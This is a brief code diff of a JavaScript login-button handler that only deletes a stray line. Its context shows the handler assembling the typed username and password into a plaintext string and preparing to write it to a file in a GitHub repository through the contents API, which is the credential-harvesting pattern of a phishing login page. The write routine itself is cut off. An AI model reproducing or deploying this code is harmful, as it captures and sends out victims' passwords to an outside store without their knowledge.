@@ -14,7 +14,6 @@ document.querySelector('.loginButton').addEventListener('click', () => {
       const apiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`
 
       const newTextContent = `username - "${username.value}" | password - "${password.value}"`
-      un
 
       const updateFile = async () => {
         try {
